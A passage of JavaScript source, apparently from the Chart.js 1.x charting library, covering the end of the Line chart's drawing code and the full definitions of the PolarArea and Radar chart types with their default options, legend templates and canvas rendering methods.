						else if (point.controlPoints.inner.y < this.scale.startPoint){


							point.controlPoints.inner.y = this.scale.startPoint;


						}


					},this);


				}








				//Draw the line between all the points


				ctx.lineWidth = this.options.datasetStrokeWidth;


				ctx.strokeStyle = dataset.strokeColor;


				ctx.beginPath();





				helpers.each(pointsWithValues, function(point, index){


					if (index === 0){


						ctx.moveTo(point.x, point.y);


					}


					else{


						if(this.options.bezierCurve){


							var previous = previousPoint(point, pointsWithValues, index);





							ctx.bezierCurveTo(


								previous.controlPoints.outer.x,


								previous.controlPoints.outer.y,


								point.controlPoints.inner.x,


								point.controlPoints.inner.y,


								point.x,


								point.y


							);


						}


						else{


							ctx.lineTo(point.x,point.y);


						}


					}


				}, this);





				if (this.options.datasetStroke) {


					ctx.stroke();


				}





				if (this.options.datasetFill && pointsWithValues.length > 0){


					//Round off the line by going to the base of the chart, back to the start, then fill.


					ctx.lineTo(pointsWithValues[pointsWithValues.length - 1].x, this.scale.endPoint);


					ctx.lineTo(pointsWithValues[0].x, this.scale.endPoint);


					ctx.fillStyle = dataset.fillColor;


					ctx.closePath();


					ctx.fill();


				}





				//Now draw the points over the line


				//A little inefficient double looping, but better than the line


				//lagging behind the point positions


				helpers.each(pointsWithValues,function(point){


					point.draw();


				});


			},this);


		}


	});








}).call(this);





(function(){


	"use strict";





	var root = this,


		Chart = root.Chart,


		//Cache a local reference to Chart.helpers


		helpers = Chart.helpers;





	var defaultConfig = {


		//Boolean - Show a backdrop to the scale label


		scaleShowLabelBackdrop : true,





		//String - The colour of the label backdrop


		scaleBackdropColor : "rgba(255,255,255,0.75)",





		// Boolean - Whether the scale should begin at zero


		scaleBeginAtZero : true,





		//Number - The backdrop padding above & below the label in pixels


		scaleBackdropPaddingY : 2,





		//Number - The backdrop padding to the side of the label in pixels


		scaleBackdropPaddingX : 2,





		//Boolean - Show line for each value in the scale


		scaleShowLine : true,





		//Boolean - Stroke a line around each segment in the chart


		segmentShowStroke : true,





		//String - The colour of the stroke on each segment.


		segmentStrokeColor : "#fff",





		//Number - The width of the stroke value in pixels


		segmentStrokeWidth : 2,





		//Number - Amount of animation steps


		animationSteps : 100,





		//String - Animation easing effect.


		animationEasing : "easeOutBounce",





		//Boolean - Whether to animate the rotation of the chart


		animateRotate : true,





		//Boolean - Whether to animate scaling the chart from the centre


		animateScale : false,





		//String - A legend template


		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"><%if(segments[i].label){%><%=segments[i].label%><%}%></span></li><%}%></ul>"


	};








	Chart.Type.extend({


		//Passing in a name registers this chart in the Chart namespace


		name: "PolarArea",


		//Providing a defaults will also register the deafults in the chart namespace


		defaults : defaultConfig,


		//Initialize is fired when the chart is initialized - Data is passed in as a parameter


		//Config is automatically merged by the core of Chart.js, and is available at this.options


		initialize:  function(data){


			this.segments = [];


			//Declare segment class as a chart instance specific class, so it can share props for this instance


			this.SegmentArc = Chart.Arc.extend({


				showStroke : this.options.segmentShowStroke,


				strokeWidth : this.options.segmentStrokeWidth,


				strokeColor : this.options.segmentStrokeColor,


				ctx : this.chart.ctx,


				innerRadius : 0,


				x : this.chart.width/2,


				y : this.chart.height/2


			});


			this.scale = new Chart.RadialScale({


				display: this.options.showScale,


				fontStyle: this.options.scaleFontStyle,


				fontSize: this.options.scaleFontSize,


				fontFamily: this.options.scaleFontFamily,


				fontColor: this.options.scaleFontColor,


				showLabels: this.options.scaleShowLabels,


				showLabelBackdrop: this.options.scaleShowLabelBackdrop,


				backdropColor: this.options.scaleBackdropColor,


				backdropPaddingY : this.options.scaleBackdropPaddingY,


				backdropPaddingX: this.options.scaleBackdropPaddingX,


				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,


				lineColor: this.options.scaleLineColor,


				lineArc: true,


				width: this.chart.width,


				height: this.chart.height,


				xCenter: this.chart.width/2,


				yCenter: this.chart.height/2,


				ctx : this.chart.ctx,


				templateString: this.options.scaleLabel,


				valuesCount: data.length


			});





			this.updateScaleRange(data);





			this.scale.update();





			helpers.each(data,function(segment,index){


				this.addData(segment,index,true);


			},this);





			//Set up tooltip events on the chart


			if (this.options.showTooltips){


				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){


					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];


					helpers.each(this.segments,function(segment){


						segment.restore(["fillColor"]);


					});


					helpers.each(activeSegments,function(activeSegment){


						activeSegment.fillColor = activeSegment.highlightColor;


					});


					this.showTooltip(activeSegments);


				});


			}





			this.render();


		},


		getSegmentsAtEvent : function(e){


			var segmentsArray = [];





			var location = helpers.getRelativePosition(e);





			helpers.each(this.segments,function(segment){


				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);


			},this);


			return segmentsArray;


		},


		addData : function(segment, atIndex, silent){


			var index = atIndex || this.segments.length;





			this.segments.splice(index, 0, new this.SegmentArc({


				fillColor: segment.color,


				highlightColor: segment.highlight || segment.color,


				label: segment.label,


				value: segment.value,


				outerRadius: (this.options.animateScale) ? 0 : this.scale.calculateCenterOffset(segment.value),


				circumference: (this.options.animateRotate) ? 0 : this.scale.getCircumference(),


				startAngle: Math.PI * 1.5


			}));


			if (!silent){


				this.reflow();


				this.update();


			}


		},


		removeData: function(atIndex){


			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;


			this.segments.splice(indexToDelete, 1);


			this.reflow();


			this.update();


		},


		calculateTotal: function(data){


			this.total = 0;


			helpers.each(data,function(segment){


				this.total += segment.value;


			},this);


			this.scale.valuesCount = this.segments.length;


		},


		updateScaleRange: function(datapoints){


			var valuesArray = [];


			helpers.each(datapoints,function(segment){


				valuesArray.push(segment.value);


			});





			var scaleSizes = (this.options.scaleOverride) ?


				{


					steps: this.options.scaleSteps,


					stepValue: this.options.scaleStepWidth,


					min: this.options.scaleStartValue,


					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)


				} :


				helpers.calculateScaleRange(


					valuesArray,


					helpers.min([this.chart.width, this.chart.height])/2,


					this.options.scaleFontSize,


					this.options.scaleBeginAtZero,


					this.options.scaleIntegersOnly


				);





			helpers.extend(


				this.scale,


				scaleSizes,


				{


					size: helpers.min([this.chart.width, this.chart.height]),


					xCenter: this.chart.width/2,


					yCenter: this.chart.height/2


				}


			);





		},


		update : function(){


			this.calculateTotal(this.segments);





			helpers.each(this.segments,function(segment){


				segment.save();


			});


			


			this.reflow();


			this.render();


		},


		reflow : function(){


			helpers.extend(this.SegmentArc.prototype,{


				x : this.chart.width/2,


				y : this.chart.height/2


			});


			this.updateScaleRange(this.segments);


			this.scale.update();





			helpers.extend(this.scale,{


				xCenter: this.chart.width/2,


				yCenter: this.chart.height/2


			});





			helpers.each(this.segments, function(segment){


				segment.update({


					outerRadius : this.scale.calculateCenterOffset(segment.value)


				});


			}, this);





		},


		draw : function(ease){


			var easingDecimal = ease || 1;


			//Clear & draw the canvas


			this.clear();


			helpers.each(this.segments,function(segment, index){


				segment.transition({


					circumference : this.scale.getCircumference(),


					outerRadius : this.scale.calculateCenterOffset(segment.value)


				},easingDecimal);





				segment.endAngle = segment.startAngle + segment.circumference;





				// If we've removed the first segment we need to set the first one to


				// start at the top.


				if (index === 0){


					segment.startAngle = Math.PI * 1.5;


				}





				//Check to see if it's the last segment, if not get the next and update the start angle


				if (index < this.segments.length - 1){


					this.segments[index+1].startAngle = segment.endAngle;


				}


				segment.draw();


			}, this);


			this.scale.draw();


		}


	});





}).call(this);





(function(){


	"use strict";





	var root = this,


		Chart = root.Chart,


		helpers = Chart.helpers;











	Chart.Type.extend({


		name: "Radar",


		defaults:{


			//Boolean - Whether to show lines for each scale point


			scaleShowLine : true,





			//Boolean - Whether we show the angle lines out of the radar


			angleShowLineOut : true,





			//Boolean - Whether to show labels on the scale


			scaleShowLabels : false,





			// Boolean - Whether the scale should begin at zero


			scaleBeginAtZero : true,





			//String - Colour of the angle line


			angleLineColor : "rgba(0,0,0,.1)",





			//Number - Pixel width of the angle line


			angleLineWidth : 1,





			//String - Point label font declaration


			pointLabelFontFamily : "'Arial'",





			//String - Point label font weight


			pointLabelFontStyle : "normal",





			//Number - Point label font size in pixels


			pointLabelFontSize : 10,





			//String - Point label font colour


			pointLabelFontColor : "#666",





			//Boolean - Whether to show a dot for each point


			pointDot : true,





			//Number - Radius of each point dot in pixels


			pointDotRadius : 3,





			//Number - Pixel width of point dot stroke


			pointDotStrokeWidth : 1,





			//Number - amount extra to add to the radius to cater for hit detection outside the drawn point


			pointHitDetectionRadius : 20,





			//Boolean - Whether to show a stroke for datasets


			datasetStroke : true,





			//Number - Pixel width of dataset stroke


			datasetStrokeWidth : 2,





			//Boolean - Whether to fill the dataset with a colour


			datasetFill : true,





			//String - A legend template


			legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"><%if(datasets[i].label){%><%=datasets[i].label%><%}%></span></li><%}%></ul>"





		},





		initialize: function(data){


			this.PointClass = Chart.Point.extend({


				strokeWidth : this.options.pointDotStrokeWidth,


				radius : this.options.pointDotRadius,


				display: this.options.pointDot,


				hitDetectionRadius : this.options.pointHitDetectionRadius,


				ctx : this.chart.ctx


			});





			this.datasets = [];





			this.buildScale(data);





			//Set up tooltip events on the chart


			if (this.options.showTooltips){


				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){


					var activePointsCollection = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];





					this.eachPoints(function(point){


						point.restore(['fillColor', 'strokeColor']);


					});


					helpers.each(activePointsCollection, function(activePoint){


						activePoint.fillColor = activePoint.highlightFill;


						activePoint.strokeColor = activePoint.highlightStroke;


					});





					this.showTooltip(activePointsCollection);


				});


			}





			//Iterate through each of the datasets, and build this into a property of the chart


			helpers.each(data.datasets,function(dataset){





				var datasetObject = {


					label: dataset.label || null,


					fillColor : dataset.fillColor,


					strokeColor : dataset.strokeColor,


					pointColor : dataset.pointColor,


					pointStrokeColor : dataset.pointStrokeColor,


					points : []


				};





				this.datasets.push(datasetObject);





				helpers.each(dataset.data,function(dataPoint,index){


					//Add a new point for each piece of data, passing any required data to draw.


					var pointPosition;


					if (!this.scale.animation){


						pointPosition = this.scale.getPointPosition(index, this.scale.calculateCenterOffset(dataPoint));


					}


					datasetObject.points.push(new this.PointClass({


						value : dataPoint,


						label : data.labels[index],


						datasetLabel: dataset.label,


						x: (this.options.animation) ? this.scale.xCenter : pointPosition.x,


						y: (this.options.animation) ? this.scale.yCenter : pointPosition.y,


						strokeColor : dataset.pointStrokeColor,


						fillColor : dataset.pointColor,


						highlightFill : dataset.pointHighlightFill || dataset.pointColor,


						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor


					}));


				},this);





			},this);





			this.render();


		},


		eachPoints : function(callback){


			helpers.each(this.datasets,function(dataset){


				helpers.each(dataset.points,callback,this);


			},this);


		},





		getPointsAtEvent : function(evt){


			var mousePosition = helpers.getRelativePosition(evt),


				fromCenter = helpers.getAngleFromPoint({


					x: this.scale.xCenter,


					y: this.scale.yCenter


				}, mousePosition);





			var anglePerIndex = (Math.PI * 2) /this.scale.valuesCount,


				pointIndex = Math.round((fromCenter.angle - Math.PI * 1.5) / anglePerIndex),


				activePointsCollection = [];





			// If we're at the top, make the pointIndex 0 to get the first of the array.


			if (pointIndex >= this.scale.valuesCount || pointIndex < 0){


				pointIndex = 0;


			}





			if (fromCenter.distance <= this.scale.drawingArea){


				helpers.each(this.datasets, function(dataset){


					activePointsCollection.push(dataset.points[pointIndex]);


				});


			}





			return activePointsCollection;


		},





		buildScale : function(data){


			this.scale = new Chart.RadialScale({


				display: this.options.showScale,


				fontStyle: this.options.scaleFontStyle,


				fontSize: this.options.scaleFontSize,


				fontFamily: this.options.scaleFontFamily,


				fontColor: this.options.scaleFontColor,


				showLabels: this.options.scaleShowLabels,


				showLabelBackdrop: this.options.scaleShowLabelBackdrop,


				backdropColor: this.options.scaleBackdropColor,


				backgroundColors: this.options.scaleBackgroundColors,


				backdropPaddingY : this.options.scaleBackdropPaddingY,


				backdropPaddingX: this.options.scaleBackdropPaddingX,


				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,


				lineColor: this.options.scaleLineColor,


				angleLineColor : this.options.angleLineColor,


				angleLineWidth : (this.options.angleShowLineOut) ? this.options.angleLineWidth : 0,


				// Point labels at the edge of each line


				pointLabelFontColor : this.options.pointLabelFontColor,


				pointLabelFontSize : this.options.pointLabelFontSize,


				pointLabelFontFamily : this.options.pointLabelFontFamily,


				pointLabelFontStyle : this.options.pointLabelFontStyle,


				height : this.chart.height,


				width: this.chart.width,


				xCenter: this.chart.width/2,


				yCenter: this.chart.height/2,


				ctx : this.chart.ctx,


				templateString: this.options.scaleLabel,


				labels: data.labels,


				valuesCount: data.datasets[0].data.length


			});





			this.scale.setScaleSize();


			this.updateScaleRange(data.datasets);


			this.scale.buildYLabels();


		},


		updateScaleRange: function(datasets){


			var valuesArray = (function(){


				var totalDataArray = [];


				helpers.each(datasets,function(dataset){


					if (dataset.data){


						totalDataArray = totalDataArray.concat(dataset.data);


					}


					else {


						helpers.each(dataset.points, function(point){


							totalDataArray.push(point.value);


						});


					}


				});


				return totalDataArray;


			})();








			var scaleSizes = (this.options.scaleOverride) ?


				{


					steps: this.options.scaleSteps,


					stepValue: this.options.scaleStepWidth,


					min: this.options.scaleStartValue,


					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)


				} :


				helpers.calculateScaleRange(


					valuesArray,


					helpers.min([this.chart.width, this.chart.height])/2,


					this.options.scaleFontSize,


					this.options.scaleBeginAtZero,


					this.options.scaleIntegersOnly


				);





			helpers.extend(


				this.scale,


				scaleSizes


			);





		},


		addData : function(valuesArray,label){


			//Map the values array for each of the datasets


			this.scale.valuesCount++;


			helpers.each(valuesArray,function(value,datasetIndex){


				var pointPosition = this.scale.getPointPosition(this.scale.valuesCount, this.scale.calculateCenterOffset(value));


				this.datasets[datasetIndex].points.push(new this.PointClass({


					value : value,


					label : label,


					datasetLabel: this.datasets[datasetIndex].label,


					x: pointPosition.x,


					y: pointPosition.y,


					strokeColor : this.datasets[datasetIndex].pointStrokeColor,


					fillColor : this.datasets[datasetIndex].pointColor


				}));


			},this);





			this.scale.labels.push(label);





			this.reflow();





			this.update();


		},


		removeData : function(){


			this.scale.valuesCount--;


			this.scale.labels.shift();


			helpers.each(this.datasets,function(dataset){


				dataset.points.shift();


			},this);


			this.reflow();


			this.update();


		},


		update : function(){


			this.eachPoints(function(point){


				point.save();


			});


			this.reflow();


			this.render();


		},


		reflow: function(){


			helpers.extend(this.scale, {


				width : this.chart.width,


				height: this.chart.height,


				size : helpers.min([this.chart.width, this.chart.height]),


				xCenter: this.chart.width/2,


				yCenter: this.chart.height/2


			});


			this.updateScaleRange(this.datasets);


			this.scale.setScaleSize();


			this.scale.buildYLabels();


		},


		draw : function(ease){


			var easeDecimal = ease || 1,


				ctx = this.chart.ctx;


			this.clear();


			this.scale.draw();





			helpers.each(this.datasets,function(dataset){





				//Transition each point first so that the line and point drawing isn't out of sync


				helpers.each(dataset.points,function(point,index){


					if (point.hasValue()){


						point.transition(this.scale.getPointPosition(index, this.scale.calculateCenterOffset(point.value)), easeDecimal);


					}


				},this);











				//Draw the line between all the points


				ctx.lineWidth = this.options.datasetStrokeWidth;


				ctx.strokeStyle = dataset.strokeColor;


				ctx.beginPath();


				helpers.each(dataset.points,function(point,index){


					if (index === 0){


						ctx.moveTo(point.x,point.y);


					}


					else{


						ctx.lineTo(point.x,point.y);


					}


				},this);


				ctx.closePath();


				ctx.stroke();





				ctx.fillStyle = dataset.fillColor;


				if(this.options.datasetFill){


					ctx.fill();


				}


				//Now draw the points over the line


				//A little inefficient double looping, but better than the line


				//lagging behind the point positions


				helpers.each(dataset.points,function(point){


					if (point.hasValue()){


						point.draw();


					}


				});





			},this);





		}





	});

















}).call(this);


